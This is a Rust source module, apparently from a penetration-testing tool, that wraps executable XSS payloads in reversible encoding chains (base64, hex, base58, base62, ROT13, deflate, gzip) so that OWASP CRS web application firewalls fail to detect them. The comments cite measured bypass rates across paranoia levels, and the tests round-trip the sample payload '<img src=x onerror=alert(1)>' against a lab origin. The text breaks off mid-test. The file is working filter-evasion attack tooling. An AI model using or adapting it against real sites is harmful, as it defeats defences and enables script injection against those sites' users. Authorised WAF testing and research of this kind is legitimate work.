//! App-transform encodings — the **WAF-opaque delivery** axis for `exploit`.
//!
//! The payload-token axis (which bytes) and reflection-context axis (where they
//! land) are exhausted against a signature WAF: OWASP CRS blocks every
//! executable markup/JS vector at every paranoia level, in every reflection
//! context, because it normalises the encodings it *knows* (URL, HTML-entity,
//! JS, CSS) with its own transforms before matching, and 403s double-URL
//! outright. What it cannot do is reverse an **application-side decoder it has
//! no transform for**.
//!
//! Many real applications run an attacker-controllable value through exactly
//! such a decoder before it reaches a sink: `atob()` in a SPA, a base64/hex
//! token field rendered after decode, a value the backend hex- or base32-
//! decodes. To that WAF the value is an opaque high-entropy blob carrying NO
//! XSS signature; the app decodes it to live markup and it executes. Empirically
//! (`bench/waf-zoo/reflect-origin`, CRS 4.x PL1–PL4): base64 and hex blobs of
//! `<img src=x onerror=alert(1)>` pass with anomaly score ~3 (threshold 5) and
//! execute, while the SAME payload raw — and the encodings CRS *does* model
//! (`\uXXXX`, `&#60;`, double-URL) — are 403'd. The exploit surface is the
//! transform the WAF can't model, not its regex engine.
//!
//! This module is the encoder half: given the operator-declared app transform
//! (the discovered decode behaviour), wrap an executable payload in the matching
//! opaque encoding so the WAF sees inert bytes. The decoder half lives in the
//! application (modelled by the lab origin's `ctx=b64|hex|b32|rot13` sinks).
//!
//! **Transforms are pipelines, not opaque functions.** Each catalog entry is a
//! list of reversible [`Stage`]s applied innermost-first, so a chain (`b64x2`),
//! a compression idiom (`zb64` = deflate→base64), and its PL4-clean twin (`zhex`
//! = deflate→hex) are all the *same* machinery with different stage lists — one
//! `deflate` primitive, one base64 primitive, composed by data. The set is
//! Tier-B data: add an [`AppTransform`] row (a new stage list) to model another
//! app decoder; add a [`Stage`] only for a genuinely new primitive.

/// One reversible encoding stage — the atom transforms are built from. A WAF
/// that models every base-N transform individually still can't reverse a *chain*
/// of them, or compression, so composing these is what defeats it.
///
/// Stages are applied **innermost-first**: the pipeline `[Deflate, B64]` yields
/// `base64(deflate(payload))`, exactly what an app that base64-decodes *then*
/// zlib-inflates expects to receive. Every text stage emits ASCII; `Deflate`
/// emits binary and is therefore always chained into a following text stage.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Stage {
    /// zlib (RFC 1950) DEFLATE — the URL-state-compression idiom (pako /
    /// lz-string). Binary output; a signature WAF has no transform to inflate it.
    Deflate,
    /// RAW DEFLATE (RFC 1951) — no zlib header/checksum. The `pako.inflateRaw`
    /// idiom that dominates JS SPAs (and `zlib.decompress(data, -15)` server-
    /// side). A distinct decoder class from zlib: a WAF that models neither can
    /// inflate it. Binary output.
    DeflateRaw,
    /// gzip (RFC 1952) framing — `gzip.decompress` / `zlib.gunzip` / a gzipped
    /// body field. Yet another compression a signature WAF cannot reverse.
    /// Binary output.
    Gzip,
    /// Standard base64 (`+`/`/`/`=` alphabet). NB: those three chars are exactly
    /// what CRS PL4 rule 942432 counts — prefer a clean-alphabet stage at PL4.
    B64,
    /// URL-safe base64, no padding (`-_`, JWT/URL convention); the origin
    /// restores padding before decoding.
    B64Url,
    /// Lowercase hex, no separators — a PL4-clean `[0-9a-f]` alphabet.
    Hex,
    /// Lowercase hex with a `0x` prefix the app strips before decoding.
    Hex0x,
    /// RFC4648 base32, uppercase, `=` padded.
    B32,
    /// Base62 (`0-9A-Za-z`) — a PURE-ALPHANUMERIC bignum encoding: the *maximally
    /// clean* alphabet, ZERO special characters for any CRS rule to count, and
    /// denser than hex (≈5.95 vs 4 bits/char → shorter blobs, less length-anomaly
    /// surface). Used by URL shorteners / short-ID schemes. No external dep.
    B62,
    /// ROT13 over ASCII letters; preserves shape/length yet carries no XSS
    /// keyword — proof "opaque" need not mean "high-entropy".
    Rot13,
    /// Bitcoin base58 (no `0OIl`, no `+`/`/`) — a clean-alphabet bignum encoding.
    B58,
}

impl Stage {
    /// Apply this stage to raw bytes, yielding the encoded bytes. Text stages
    /// return ASCII; `Deflate` returns binary and is always followed by a text
    /// stage in a real pipeline (so the pipeline's final output is ASCII).
    fn apply(self, input: &[u8]) -> Vec<u8> {
        use base64::Engine;
        match self {
            Stage::Deflate => deflate(input),
            Stage::DeflateRaw => deflate_raw(input),
            Stage::Gzip => gzip(input),
            Stage::B64 => base64::engine::general_purpose::STANDARD
                .encode(input)
                .into_bytes(),
            Stage::B64Url => base64::engine::general_purpose::URL_SAFE_NO_PAD
                .encode(input)
                .into_bytes(),
            Stage::Hex => hex::encode(input).into_bytes(),
            Stage::Hex0x => format!("0x{}", hex::encode(input)).into_bytes(),
            Stage::B32 => b32_encode(input).into_bytes(),
            Stage::B62 => b62_encode(input).into_bytes(),
            Stage::Rot13 => rot13(input),
            Stage::B58 => b58_encode(input).into_bytes(),
        }
    }
}

/// Fold a payload through a pipeline of stages, innermost-first. Every catalog
/// pipeline terminates in a text stage, so the result is valid ASCII; the
/// `expect` documents that invariant (it can only fire for a hand-built
/// binary-terminated chain, which the catalog never contains).
pub(crate) fn encode_stages(stages: &[Stage], payload: &str) -> String {
    let mut buf = payload.as_bytes().to_vec();
    for stage in stages {
        buf = stage.apply(&buf);
    }
    String::from_utf8(buf)
        .expect("app-transform pipeline must terminate in a text stage (ASCII output)")
}

/// One app-side decode behaviour and the encoder pipeline that feeds it. `ctx`
/// is the lab origin's matching sink selector (documentation / sweep wiring);
/// `stages` is the pipeline wafrift puts on the wire (innermost-first).
#[derive(Debug)]
pub(crate) struct AppTransform {
    /// Stable selector used by `--app-transform` and in EXECUTES reports.
    pub name: &'static str,
    /// The reflect-origin `ctx=` sink that decodes this encoding (lab wiring).
    pub ctx: &'static str,
    /// One-line description of the app behaviour this models.
    pub note: &'static str,
    /// Reversible stage pipeline, applied innermost-first, that produces the
    /// WAF-opaque form the app decodes.
    pub stages: &'static [Stage],
}

impl AppTransform {
    /// Encode an executable payload into the WAF-opaque form the app decodes.
    pub fn encode(&self, payload: &str) -> String {
        encode_stages(self.stages, payload)
    }
}

/// The Tier-B catalog of WAF-opaque app transforms. Each models a real, common
/// application decode, expressed as a [`Stage`] pipeline. `rot13` is included as
/// a structural opposite of base/hex (it preserves length and ASCII shape yet
/// still slips CRS, because `<vzt fep=k ...>` matches no known-tag/event-handler
/// signature) — a useful proof that "opaque" need not mean "high-entropy". The
/// composite rows (`zb64`, `zhex`, `b64x2`) are multi-stage pipelines, not
/// bespoke functions: a WAF that reverses every single transform still can't
/// reverse a chain.
pub(crate) const APP_TRANSFORMS: &[AppTransform] = &[
    AppTransform {
        name: "b64",
        ctx: "b64",
        note: "app base64-decodes the value (atob / standard base64 token)",
        stages: &[Stage::B64],
    },
    AppTransform {
        name: "b64url",
        ctx: "b64",
        note: "URL-safe base64 (JWT-style -_ alphabet); origin b64 decode is alphabet-tolerant",
        stages: &[Stage::B64Url],
    },
    AppTransform {
        name: "hex",
        ctx: "hex",
        note: "app hex-decodes the value (lowercase, no separators)",
        stages: &[Stage::Hex],
    },
    AppTransform {
        name: "hex0x",
        ctx: "hex",
        note: "hex with a 0x prefix the origin strips before decoding",
        stages: &[Stage::Hex0x],
    },
    AppTransform {
        name: "b32",
        ctx: "b32",
        note: "app base32-decodes the value (RFC4648, padded)",
        stages: &[Stage::B32],
    },
    AppTransform {
        name: "rot13",
        ctx: "rot13",
        note: "app ROT13-decodes the value; preserves shape yet carries no XSS signature",
        stages: &[Stage::Rot13],
    },
    // ── categorically distinct primitives & chains (not base-N variants) ──────
    // These prove the axis is the *decoder class*, not one encoding: a WAF that
    // models every base-N transform still can't reverse compression, a bignum
    // alphabet, or a multi-stage decode chain.
    AppTransform {
        name: "zb64",
        ctx: "zb64",
        note: "app base64-decodes then zlib-inflates (pako/lz-string URL-state compression) — a signature WAF cannot inflate DEFLATE",
        stages: &[Stage::Deflate, Stage::B64],
    },
    AppTransform {
        name: "zhex",
        ctx: "zhex",
        note: "app hex-decodes then zlib-inflates — compression with a PL4-CLEAN [0-9a-f] alphabet; bypasses CRS PL4 where zb64's +/= chars are flagged (empirically 100% vs 27%)",
        stages: &[Stage::Deflate, Stage::Hex],
    },
    AppTransform {
        name: "b58",
        ctx: "b58",
        note: "app base58-decodes the value (Bitcoin alphabet; web3/crypto identifiers)",
        stages: &[Stage::B58],
    },
    AppTransform {
        name: "b64x2",
        ctx: "b64x2",
        note: "app base64-decodes twice (a decode chain — breaks a WAF that reverses only one layer)",
        stages: &[Stage::B64, Stage::B64],
    },
    AppTransform {
        name: "b62",
        ctx: "b62",
        note: "app base62-decodes the value (URL-shortener / short-ID alphabet) — pure alphanumeric, ZERO special chars (the cleanest blob at CRS PL4)",
        stages: &[Stage::B62],
    },
    AppTransform {
        name: "zrawb64",
        ctx: "zrawb64",
        note: "app base64-decodes then RAW-inflates (pako.inflateRaw — no zlib header; the dominant JS-SPA URL-state idiom a WAF cannot model)",
        stages: &[Stage::DeflateRaw, Stage::B64],
    },
];

/// Resolve an `--app-transform` spec (comma-separated names, or `all`) into the
/// transforms to apply, preserving catalog order and de-duplicating. Returns an
/// error naming the offending token (and the valid set) on any unknown name, so
/// a typo fails closed rather than silently firing fewer transforms.
pub(crate) fn resolve(spec: &str) -> Result<Vec<&'static AppTransform>, String> {
    let spec = spec.trim();
    if spec.eq_ignore_ascii_case("all") {
        return Ok(APP_TRANSFORMS.iter().collect());
    }
    // Validate every requested name first (fail closed on a typo), collecting
    // the request set; then emit in CATALOG order so reports and sweeps are
    // deterministic regardless of how the operator ordered the flag.
    let mut requested: Vec<&str> = Vec::new();
    for tok in spec.split(',').map(str::trim).filter(|t| !t.is_empty()) {
        if by_name(tok).is_none() {
            return Err(format!(
                "unknown app-transform `{tok}` — valid: {} (or `all`)",
                all_names().join(", ")
            ));
        }
        if !requested.contains(&tok) {
            requested.push(tok);
        }
    }
    if requested.is_empty() {
        return Err(format!(
            "no app-transform selected — valid: {} (or `all`)",
            all_names().join(", ")
        ));
    }
    Ok(APP_TRANSFORMS
        .iter()
        .filter(|t| requested.contains(&t.name))
        .collect())
}

/// Look up a transform by exact name.
pub(crate) fn by_name(name: &str) -> Option<&'static AppTransform> {
    APP_TRANSFORMS.iter().find(|t| t.name == name)
}

/// Every transform name, in catalog order — for help text and error messages.
pub(crate) fn all_names() -> Vec<&'static str> {
    APP_TRANSFORMS.iter().map(|t| t.name).collect()
}

impl Stage {
    /// Parse one chain token (the `--transform-chain` surface) into a stage.
    fn from_token(tok: &str) -> Option<Stage> {
        Some(match tok {
            "deflate" => Stage::Deflate,
            "deflate-raw" => Stage::DeflateRaw,
            "gzip" => Stage::Gzip,
            "b64" => Stage::B64,
            "b64url" => Stage::B64Url,
            "hex" => Stage::Hex,
            "hex0x" => Stage::Hex0x,
            "b32" => Stage::B32,
            "b62" => Stage::B62,
            "rot13" => Stage::Rot13,
            "b58" => Stage::B58,
            _ => return None,
        })
    }

    /// The canonical chain token for this stage (inverse of [`Stage::from_token`]).
    fn token(self) -> &'static str {
        match self {
            Stage::Deflate => "deflate",
            Stage::DeflateRaw => "deflate-raw",
            Stage::Gzip => "gzip",
            Stage::B64 => "b64",
            Stage::B64Url => "b64url",
            Stage::Hex => "hex",
            Stage::Hex0x => "hex0x",
            Stage::B32 => "b32",
            Stage::B62 => "b62",
            Stage::Rot13 => "rot13",
            Stage::B58 => "b58",
        }
    }

    /// `true` if this stage emits raw (non-text) bytes. The compression stages
    /// (`deflate`, `deflate-raw`, `gzip`) do; a pipeline must never *end* on one
    /// (the app receives bytes it can't read as a text value and [`encode_stages`]
    /// cannot finalise to a `String`).
    fn produces_binary(self) -> bool {
        matches!(self, Stage::Deflate | Stage::DeflateRaw | Stage::Gzip)
    }
}

/// Every chain-stage token, in declaration order — for help text and errors.
pub(crate) fn stage_token_names() -> Vec<&'static str> {
    [
        Stage::Deflate,
        Stage::DeflateRaw,
        Stage::Gzip,
        Stage::B64,
        Stage::B64Url,
        Stage::Hex,
        Stage::Hex0x,
        Stage::B32,
        Stage::B62,
        Stage::Rot13,
        Stage::B58,
    ]
    .iter()
    .map(|s| s.token())
    .collect()
}

/// Count the characters in `s` that CRS's restricted-character rules flag (the
/// PL4 "special character anomaly" surface — base64's `+`/`/`/`=`, a `0x`-style
/// literal, etc.). A pure-alphanumeric blob scores 0; this is the measured,
/// data-driven form of the "clean alphabet bypasses PL4" finding — the encoder's
/// PL4 risk is now computable, not folklore. ASCII-alphanumeric and the bignum
/// alphabets (no padding/sign chars) are clean; everything else counts.
pub(crate) fn pl4_special_chars(s: &str) -> usize {
    s.chars().filter(|c| !c.is_ascii_alphanumeric()).count()
}

/// Parse a `--transform-chain` spec — a dot-separated pipeline of stage tokens,
/// applied innermost-first (`deflate.hex` ⇒ `hex(deflate(payload))`, the app
/// hex-decodes then zlib-inflates). This is the operator-facing generalisation
/// of the named catalog: any clean-alphabet composition the engagement needs,
/// not just the shipped rows. Fails closed (naming the offending token and the
/// valid set) on an unknown stage, an empty spec, or — the key audit guard — a
/// pipeline that ends in a binary stage (`deflate`), which would otherwise feed
/// the app raw bytes and panic the UTF-8 finalisation in [`encode_stages`].
pub(crate) fn parse_chain(spec: &str) -> Result<Vec<Stage>, String> {
    let spec = spec.trim();
    let mut stages: Vec<Stage> = Vec::new();
    for tok in spec.split('.').map(str::trim).filter(|t| !t.is_empty()) {
        match Stage::from_token(tok) {
            Some(s) => stages.push(s),
            None => {
                return Err(format!(
                    "unknown transform-chain stage `{tok}` — valid: {} (dot-separated, \
                     innermost first, e.g. `deflate.hex`)",
                    stage_token_names().join(", ")
                ));
            }
        }
    }
    if stages.is_empty() {
        return Err(format!(
            "empty transform-chain — give a dot-separated pipeline, e.g. `deflate.hex` \
             (valid stages: {})",
            stage_token_names().join(", ")
        ));
    }
    if let Some(last) = stages.last()
        && last.produces_binary()
    {
        return Err(format!(
            "transform-chain must end in a text stage — `{}` emits binary bytes the app \
             cannot read as a value; append an encoder, e.g. `{spec}.hex` or `{spec}.b64`",
            last.token()
        ));
    }
    Ok(stages)
}

// ── Stage primitives ─────────────────────────────────────────────────────────
// Each is the inverse of the matching origin decoder, operating on raw bytes so
// stages compose: a binary `Deflate` feeds a text stage, a text stage feeds
// another text stage (the decode chains). base64/hex are inlined in `apply`;
// the multi-line primitives live here.

/// zlib (RFC 1950) DEFLATE of the input — zlib framing so Python's stdlib
/// `zlib.decompress` (the overwhelmingly common server side) reads it directly.
/// Writes to a `Vec`, so every I/O call is infallible.
fn deflate(input: &[u8]) -> Vec<u8> {
    use flate2::{Compression, write::ZlibEncoder};
    use std::io::Write;
    let mut e = ZlibEncoder::new(Vec::new(), Compression::best());
    e.write_all(input)
        .expect("ZlibEncoder write to Vec is infallible");
    e.finish().expect("ZlibEncoder finish on Vec is infallible")
}

/// RAW DEFLATE (RFC 1951) — no zlib header or adler32 checksum. Matches
/// `pako.inflateRaw` (JS) and `zlib.decompress(data, -15)` (Python). The bare
/// compressed stream a signature WAF cannot inflate, with no framing to fingerprint.
fn deflate_raw(input: &[u8]) -> Vec<u8> {
    use flate2::{Compression, write::DeflateEncoder};
    use std::io::Write;
    let mut e = DeflateEncoder::new(Vec::new(), Compression::best());
    e.write_all(input)
        .expect("DeflateEncoder write to Vec is infallible");
    e.finish()
        .expect("DeflateEncoder finish on Vec is infallible")
}

/// gzip (RFC 1952) framing — gzip magic + CRC32. Matches `gzip.decompress` /
/// `zlib.gunzip` / `pako.ungzip`. NB: gzip embeds an OS byte; flate2 fixes it to
/// a constant, so the output is deterministic for a given input (round-trip and
/// dedup stay stable).
fn gzip(input: &[u8]) -> Vec<u8> {
    use flate2::{Compression, write::GzEncoder};
    use std::io::Write;
    let mut e = GzEncoder::new(Vec::new(), Compression::best());
    e.write_all(input)
        .expect("GzEncoder write to Vec is infallible");
    e.finish().expect("GzEncoder finish on Vec is infallible")
}

/// Base62 (`0-9A-Za-z`, GMP digit order) — big-endian base-256 → base-62 via
/// repeated division, leading zero bytes mapped to leading `0`s. The same
/// bignum scheme as base58 but PURE ALPHANUMERIC: no `+`/`/`/`=`/sign chars, so
/// [`pl4_special_chars`] of its output is 0 — the cleanest possible blob for a
/// character-counting WAF rule. No external dependency.
fn b62_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8; 62] = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    let zeros = data.iter().take_while(|&&b| b == 0).count();
    let mut digits: Vec<u8> = Vec::new();
    for &byte in data {
        let mut carry = byte as u32;
        for d in digits.iter_mut() {
            carry += (*d as u32) << 8;
            *d = (carry % 62) as u8;
            carry /= 62;
        }
        while carry > 0 {
            digits.push((carry % 62) as u8);
            carry /= 62;
        }
    }
    let mut out = String::with_capacity(zeros + digits.len());
    for _ in 0..zeros {
        out.push('0');
    }
    for &d in digits.iter().rev() {
        out.push(ALPHABET[d as usize] as char);
    }
    out
}

/// ROT13 over ASCII letters; every other byte passes through unchanged. Its own
/// inverse, so the app's ROT13-decode restores the payload.
fn rot13(input: &[u8]) -> Vec<u8> {
    input
        .iter()
        .map(|&b| match b {
            b'A'..=b'Z' => b'A' + (b - b'A' + 13) % 26,
            b'a'..=b'z' => b'a' + (b - b'a' + 13) % 26,
            other => other,
        })
        .collect()
}

/// RFC4648 base32 (uppercase, `=` padded) — no external dep. Encodes each
/// 5-byte group into 8 chars, padding the final partial group.
fn b32_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8; 32] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    let mut out = String::new();
    for chunk in data.chunks(5) {
        // Pack up to 5 bytes into a 40-bit big-endian buffer.
        let mut buf: u64 = 0;
        for &b in chunk {
            buf = (buf << 8) | b as u64;
        }
        // Left-align so the top bit of the first byte is bit 39.
        buf <<= 8 * (5 - chunk.len());
        // 5 input bytes → 8 output symbols; emit only the symbols backed by
        // input bits, pad the rest with '='.
        let symbols = (chunk.len() * 8).div_ceil(5);
        for i in 0..8 {
            if i < symbols {
                let idx = ((buf >> (35 - 5 * i)) & 0x1f) as usize;
                out.push(ALPHABET[idx] as char);
            } else {
                out.push('=');
            }
        }
    }
    out
}

/// Bitcoin base58 (RFC-less, but a single canonical alphabet). Big-endian
/// base-256 → base-58 via repeated division; leading zero bytes map to leading
/// `1`s. No external dependency.
fn b58_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8; 58] = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    let zeros = data.iter().take_while(|&&b| b == 0).count();
    // base58 digits, little-endian; repeated (value*256 + byte) / 58.
    let mut digits: Vec<u8> = Vec::new();
    for &byte in data {
        let mut carry = byte as u32;
        for d in digits.iter_mut() {
            carry += (*d as u32) << 8;
            *d = (carry % 58) as u8;
            carry /= 58;
        }
        while carry > 0 {
            digits.push((carry % 58) as u8);
            carry /= 58;
        }
    }
    let mut out = String::with_capacity(zeros + digits.len());
    for _ in 0..zeros {
        out.push('1');
    }
    for &d in digits.iter().rev() {
        out.push(ALPHABET[d as usize] as char);
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    const P: &str = "<img src=x onerror=alert(1)>";

    /// Encode the sample payload through a named catalog transform — exercises
    /// the real public path (`AppTransform::encode`) the operator hits.
    fn enc(name: &str) -> String {
        by_name(name).expect("known transform").encode(P)
    }

    // ── round-trip: every encoder is the inverse of the app decoder ──────────

    #[test]
    fn b64_round_trips() {
        use base64::Engine;
        let e = enc("b64");
        let d = base64::engine::general_purpose::STANDARD
            .decode(&e)
            .unwrap();
        assert_eq!(String::from_utf8(d).unwrap(), P);
        // Carries no literal XSS token for the WAF to match.
        assert!(!e.contains('<') && !e.contains("onerror") && !e.contains("alert"));
    }

    #[test]
    fn b64url_round_trips_with_padding_restored() {
        use base64::Engine;
        let e = enc("b64url");
        assert!(!e.contains('+') && !e.contains('/') && !e.contains('='));
        // Restore padding the way the origin does, then decode.
        let mut s = e.replace('-', "+").replace('_', "/");
        while !s.len().is_multiple_of(4) {
            s.push('=');
        }
        let d = base64::engine::general_purpose::STANDARD
            .decode(&s)
            .unwrap();
        assert_eq!(String::from_utf8(d).unwrap(), P);
    }

    #[test]
    fn hex_round_trips() {
        let e = enc("hex");
        assert_eq!(String::from_utf8(hex::decode(&e).unwrap()).unwrap(), P);
        assert!(e.bytes().all(|b| b.is_ascii_hexdigit()));
    }

    #[test]
    fn hex0x_has_prefix_and_round_trips() {
        let e = enc("hex0x");
        assert!(e.starts_with("0x"));
        let d = hex::decode(e.trim_start_matches("0x")).unwrap();
        assert_eq!(String::from_utf8(d).unwrap(), P);
    }

    #[test]
    fn rot13_is_its_own_inverse_and_hides_keywords() {
        let e = enc("rot13");
        // Decoding (== applying rot13 again) restores the payload.
        assert_eq!(encode_stages(&[Stage::Rot13], &e), P);
        // The signature keywords are gone from the encoded form.
        assert!(!e.contains("onerror") && !e.contains("alert") && !e.contains("img"));
        // Structure (the non-letters) is preserved — that's the point.
        assert!(e.contains('<') && e.contains('=') && e.contains('>'));
    }

    #[test]
    fn b32_matches_known_vector() {
        // RFC4648 test vectors — pins the hand-rolled stage primitive.
        assert_eq!(encode_stages(&[Stage::B32], "f"), "MY======");
        assert_eq!(encode_stages(&[Stage::B32], "fo"), "MZXQ====");
        assert_eq!(encode_stages(&[Stage::B32], "foo"), "MZXW6===");
        assert_eq!(encode_stages(&[Stage::B32], "foob"), "MZXW6YQ=");
        assert_eq!(encode_stages(&[Stage::B32], "fooba"), "MZXW6YTB");
        assert_eq!(encode_stages(&[Stage::B32], "foobar"), "MZXW6YTBOI======");
    }

    #[test]
    fn b32_payload_round_trips_via_origin_rule() {
        // Decode the way the origin does (uppercase, pad to /8) using a tiny
        // reference decoder, proving the encoder feeds the b32 sink.
        let e = enc("b32");
        assert_eq!(b32_decode(&e), P);
        assert!(!e.contains('<') && !e.contains("alert"));
    }

    // Reference RFC4648 decoder for the test only.
    fn b32_decode(s: &str) -> String {
        const A: &[u8; 32] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        let mut bits = 0u64;
        let mut nbits = 0u32;
        let mut out = Vec::new();
        for c in s.bytes().filter(|&c| c != b'=') {
            let v = A.iter().position(|&a| a == c).expect("valid b32 char") as u64;
            bits = (bits << 5) | v;
            nbits += 5;
            if nbits >= 8 {
                nbits -= 8;
                out.push((bits >> nbits) as u8);
            }
        }
        String::from_utf8(out).unwrap()
    }

    #[test]
    fn deflate_b64_round_trips_via_zlib() {
        // Inflate the way the origin does: base64-decode, then zlib-inflate.
        use base64::Engine;
        use flate2::read::ZlibDecoder;
        use std::io::Read;
        let e = enc("zb64");
        let raw = base64::engine::general_purpose::STANDARD
            .decode(&e)
            .expect("valid base64");
        let mut z = ZlibDecoder::new(&raw[..]);
        let mut out = String::new();
        z.read_to_string(&mut out).expect("valid zlib stream");
        assert_eq!(out, P);
        // Opaque: no XSS literal survives compression+base64.
        assert!(!e.contains('<') && !e.contains("onerror") && !e.contains("alert"));
    }

    #[test]
    fn deflate_hex_round_trips_and_is_clean_alphabet() {
        // Inflate the way the origin does: hex-decode, then zlib-inflate.
        use flate2::read::ZlibDecoder;
        use std::io::Read;
        let e = enc("zhex");
        // The whole point: a PL4-clean alphabet — only [0-9a-f], no +/= for CRS
        // to flag.
        assert!(
            e.bytes()
                .all(|b| b.is_ascii_hexdigit() && !b.is_ascii_uppercase())
        );
        let raw = hex::decode(&e).expect("valid hex");
        let mut z = ZlibDecoder::new(&raw[..]);
        let mut out = String::new();
        z.read_to_string(&mut out).expect("valid zlib stream");
        assert_eq!(out, P);
        assert!(!e.contains('<') && !e.contains("alert"));
    }

    #[test]
    fn zb64_and_zhex_share_one_deflate_differing_only_in_alphabet() {
        // The dedup invariant: both compression transforms run the SAME deflate
        // primitive and differ ONLY in the terminal text stage. Decoding each
        // outer alphabet must yield byte-identical compressed streams — proof
        // there is one `deflate`, not two divergent hand-rolled copies.
        use base64::Engine;
        let from_b64 = base64::engine::general_purpose::STANDARD
            .decode(enc("zb64"))
            .expect("valid base64");
        let from_hex = hex::decode(enc("zhex")).expect("valid hex");
        assert_eq!(
            from_b64, from_hex,
            "zb64 and zhex must compress identically; only the alphabet differs"
        );
    }

    #[test]
    fn b58_matches_known_vector_and_round_trips() {
        // Canonical Bitcoin-base58 vector pins the hand-rolled stage primitive.
        assert_eq!(
            encode_stages(&[Stage::B58], "Hello World!"),
            "2NEpo7TZRRrLZSi2U"
        );
        // Round-trip through a reference decoder proves it feeds the b58 sink.
        assert_eq!(b58_decode(&enc("b58")), P);
        let e = enc("b58");
        assert!(!e.contains('<') && !e.contains("alert"));
    }

    // Reference base58 decoder for the test only (base-58 → base-256).
    fn b58_decode(s: &str) -> String {
        const A: &[u8; 58] = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        let zeros = s.bytes().take_while(|&c| c == b'1').count();
        let mut bytes: Vec<u8> = Vec::new();
        for c in s.bytes() {
            let mut carry = A.iter().position(|&a| a == c).expect("valid b58 char") as u32;
            for b in bytes.iter_mut() {
                carry += (*b as u32) * 58;
                *b = (carry & 0xff) as u8;
                carry >>= 8;
            }
            while carry > 0 {
                bytes.push((carry & 0xff) as u8);
                carry >>= 8;
            }
        }
        let mut out = vec![0u8; zeros];
        out.extend(bytes.iter().rev());
        String::from_utf8(out).unwrap()
    }

    #[test]
    fn b64x2_is_two_base64_layers() {
        use base64::Engine;
        let e = enc("b64x2");
        let once = base64::engine::general_purpose::STANDARD
            .decode(&e)
            .expect("outer base64");
        let twice = base64::engine::general_purpose::STANDARD
            .decode(&once)
            .expect("inner base64");
        assert_eq!(String::from_utf8(twice).unwrap(), P);
        // After ONE decode the value is still an opaque base64 blob — a WAF that
        // peels a single layer gains no XSS signature.
        let after_one = String::from_utf8(once).unwrap();
        assert!(!after_one.contains('<') && !after_one.contains("alert"));
    }

    // ── pipeline machinery: composition is associative & data-driven ─────────

    #[test]
    fn pipeline_composes_left_to_right_innermost_first() {
        // A two-stage pipeline must equal applying the stages by hand, in order:
        // [Deflate, Hex] == hex(deflate(P)). This is the law every composite row
        // relies on; it also guards against an accidental fold reversal.
        let piped = encode_stages(&[Stage::Deflate, Stage::Hex], P);
        let by_hand = hex::encode(deflate(P.as_bytes()));
        assert_eq!(piped, by_hand);
        // And the catalog's `zhex` is exactly that pipeline.
        assert_eq!(enc("zhex"), piped);
    }

    // ── new primitives: base62, raw-deflate, gzip + the cleanliness contract ──

    #[test]
    fn b62_is_pure_alphanumeric_and_round_trips() {
        let e = enc("b62");
        assert!(
            e.bytes().all(|b| b.is_ascii_alphanumeric()),
            "b62 must be pure alphanumeric: {e}"
        );
        assert_eq!(
            pl4_special_chars(&e),
            0,
            "b62 must carry zero PL4 special chars"
        );
        assert_eq!(b62_decode(&e), P);
        assert!(!e.contains('<') && !e.contains("alert"));
    }

    #[test]
    fn b62_known_vectors_pin_gmp_alphabet_order() {
        // Independent of the round-trip decoder (which shares the alphabet):
        // single-byte values pin the GMP digit order `0-9A-Za-z`.
        assert_eq!(encode_stages(&[Stage::B62], "\u{01}"), "1"); // value 1 → '1'
        assert_eq!(encode_stages(&[Stage::B62], "\u{0a}"), "A"); // value 10 → 'A'
        assert_eq!(encode_stages(&[Stage::B62], "\0"), "0"); // leading zero byte → '0'
    }

    // Reference base62 decoder for the test only (base-62 → base-256).
    fn b62_decode(s: &str) -> String {
        const A: &[u8; 62] = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        let zeros = s.bytes().take_while(|&c| c == b'0').count();
        let mut bytes: Vec<u8> = Vec::new();
        for c in s.bytes() {
            let mut carry = A.iter().position(|&a| a == c).expect("valid b62 char") as u32;
            for b in bytes.iter_mut() {
                carry += (*b as u32) * 62;
                *b = (carry & 0xff) as u8;
                carry >>= 8;
            }
            while carry > 0 {
                bytes.push((carry & 0xff) as u8);
                carry >>= 8;
            }
        }
        let mut out = vec![0u8; zeros];
        out.extend(bytes.iter().rev());
        String::from_utf8(out).unwrap()
    }

    #[test]
    fn deflate_raw_round_trips_via_raw_inflate() {
        // pako.inflateRaw / zlib.decompress(data,-15): no zlib header.
        use flate2::read::DeflateDecoder;
        use std::io::Read;
        let e = encode_stages(&[Stage::DeflateRaw, Stage::Hex], P);
        let raw = hex::decode(&e).expect("valid hex");
        let mut z = DeflateDecoder::new(&raw[..]);
        let mut out = String::new();
        z.read_to_string(&mut out)
            .expect("valid raw-deflate stream");
        assert_eq!(out, P);
    }

    #[test]
    fn gzip_round_trips_via_gunzip() {
        use flate2::read::GzDecoder;
        use std::io::Read;
        let e = encode_stages(&[Stage::Gzip, Stage::Hex], P);
        let raw = hex::decode(&e).expect("valid hex");
        let mut z = GzDecoder::new(&raw[..]);
        let mut out = String::new();
        z.read_to_string(&mut out).expect("valid gzip stream");
        assert_eq!(out, P);
    }

    #[test]
    fn zrawb64_round_trips_via_b64_then_raw_inflate() {
        // The named real-world idiom: atob() then pako.inflateRaw().
        use base64::Engine;
        use flate2::read::DeflateDecoder;
        use std::io::Read;
        let e = enc("zrawb64");
        let raw = base64::engine::general_purpose::STANDARD
            .decode(&e)
            .expect("valid base64");
        let mut z = DeflateDecoder::new(&raw[..]);
        let mut out = String::new();
        z.read_to_string(&mut out)
            .expect("valid raw-deflate stream");
        assert_eq!(out, P);
        assert!(!e.contains('<') && !e.contains("alert"));
    }

    #[test]
    fn pl4_special_chars_is_the_measured_alphabet_contract() {
        // The measured form of the PL4 alphabet finding. Pure-alphanumeric /
        // bignum alphabets score 0 — the cleanest at PL4.
        for clean in ["b62", "hex", "b58"] {
            assert_eq!(
                pl4_special_chars(&enc(clean)),
                0,
                "{clean} must be special-char-free"
            );
        }
        // base64 (`+`/`/` + `=` padding) and padded base32 (`=`) DETERMINISTICALLY
